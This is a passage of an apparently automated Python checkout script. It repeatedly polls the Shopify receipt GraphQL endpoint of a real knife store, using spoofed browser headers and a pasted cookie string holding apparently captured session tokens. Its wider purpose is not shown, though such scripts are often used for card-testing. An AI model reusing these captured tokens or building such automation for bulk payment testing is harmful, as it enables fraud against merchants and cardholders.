_shopify_essential=:AZbxiF2iAAEAjedXVnwtvQzKHyRNdhfbRpQp7hMWB0ULeecBlvXoZcO6nh4V8LreKyTceXxaLdRqun1NbDZY45WVyZC2MnbwvCYPaSV6ynP6fHHh7c953uIIECeD-eC3x9VdM8WYXRqrs1gcErb4UIsdd0oDQkvNzWQA0venUrX8pSE_K3IJEKC_TB9Pxl4MZ8whr_X04ojItOsdE_yY2mFTz4taiMA16C4Lz-wWquU3b-nqr2fGQz504GiLZbX8sN-9Dd_vQ4h3MU9rWzMCoME23AOzeKVa8TutGlIHxZloqFFmHV13nhxxPpRMf-SvWCB6ZNJrKG371p0LUSO6Sb6kMhXeZ6MwH-Z4JDrb3sn4OEgmpcUWMu38D2pjbfiHxQzS893hflTDyAE:; _shopify_sa_t=2025-05-21T06%3A32%3A09.137Z; _ga_7XGDR94Y27=GS2.1.s1747808756$o1$g1$t1747809129$j0$l0$h0; _ga_SY9JTQL740=GS2.1.s1747808756$o1$g1$t1747809129$j0$l0$h0',
              }

              params = {
                  'operationName': 'PollForReceipt',
              }

              json_data = {
                  'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
                  'variables': {
                      'receiptId': bill,
                      'sessionToken': x_checkout_one_session_token,
                  },
                  'operationName': 'PollForReceipt',
              }

              request = await session.post(
                  'https://shedknives.com/checkouts/unstable/graphql',
                  params=params,
                  headers=headers,
                  json=json_data,
              )

              await asyncio.sleep(5)

              headers = {
                  'accept': 'application/json',
                  'accept-language': 'en-IN',
                  'content-type': 'application/json',
                  'origin': 'https://shedknives.com',
                  'priority': 'u=1, i',
                  'referer': 'https://shedknives.com/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'shopify-checkout-client': 'checkout-web/1.0',
                  'user-agent': user,
                  'x-checkout-one-session-token': x_checkout_one_session_token,
                  'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
                  'x-checkout-web-deploy-stage': 'production',
                  'x-checkout-web-server-handling': 'fast',
                  'x-checkout-web-server-rendering': 'yes',
                  'x-checkout-web-source-id': token,
                  # 'cookie': 'secure_customer_sig=; localization=IN; cart_currency=INR; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521062556-nK9cqF0t47q3ylxncY5L4i9uAeMaEFuNOhVVbrCSxwXSCmueD; omnisendSessionID=GFstRSazqCxHv9-20250521062556; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; omnisendShopifyCart={"41696773669034":1}; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; page-views=9; keep_alive=eyJ2IjoxLCJ0cyI6MTc0NzgwODk2NDMzNiwiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjoxMSwiY2EiOjAsImthIjowLCJzYSI6MCwidCI6ODksIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxMCwicyI6MTc0NzgwODc1NjMyMiwiZCI6MTk2fX0%3D; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ=%7B%22token%22%3A%22AAEB4KXOE6KZvnqLN9zGF7Zf3IbIoIo_UKumZI9fqVtHC2oOAL2G5ayUXIX2sFbiZq5YYB73Fyrc5xAKUT5-GerwGBQMw2-928wHTVTZcRlVzM0qBZTKEQlKXgw6_7fVEOosoqm9AAiOxklztiRDB6gTZldEPa9Gq3CvEdji_38gDbDoJFCc4MgCuzTLI51_64KmfE24vKuHCoG5yslgsNQpDWxMuJtBgvvsbuwQbdvnost_Ufr4MrWUCm8OBLP2nl4W_w%22%2C%22locale%22%3A%22en-IN%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222025-05-21T06%3A29%3A28.068Z%22%7D%5D%7D; shop_pay_accelerated=%7B%22universal_redirect%22%3A1747808968%7D; auth_state_01JVRRGR7CSXTAAYTG3JXH7GNJ=c2f7fcc95d12ac452f32729b14ebcd85; skip_shop_pay=false; _shopify_s=3F85DFA6-fefc-4B56-bc4d-a0a6cb13e275; omnisendContactID=682d72f05cbef8fabb3a2746; hide_shopify_pay_for_checkout=false; _shopify_essential=:AZbxiF2iAAEAjedXVnwtvQzKHyRNdhfbRpQp7hMWB0ULeecBlvXoZcO6nh4V8LreKyTceXxaLdRqun1NbDZY45WVyZC2MnbwvCYPaSV6ynP6fHHh7c953uIIECeD-eC3x9VdM8WYXRqrs1gcErb4UIsdd0oDQkvNzWQA0venUrX8pSE_K3IJEKC_TB9Pxl4MZ8whr_X04ojItOsdE_yY2mFTz4taiMA16C4Lz-wWquU3b-nqr2fGQz504GiLZbX8sN-9Dd_vQ4h3MU9rWzMCoME23AOzeKVa8TutGlIHxZloqFFmHV13nhxxPpRMf-SvWCB6ZNJrKG371p0LUSO6Sb6kMhXeZ6MwH-Z4JDrb3sn4OEgmpcUWMu38D2pjbfiHxQzS893hflTDyAE:; _shopify_sa_t=2025-05-21T06%3A32%3A09.137Z; _ga_7XGDR94Y27=GS2.1.s1747808756$o1$g1$t1747809129$j0$l0$h0; _ga_SY9JTQL740=GS2.1.s1747808756$o1$g1$t1747809129$j0$l0$h0',
              }

              params = {
                  'operationName': 'PollForReceipt',
              }

              json_data = {
                  'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode 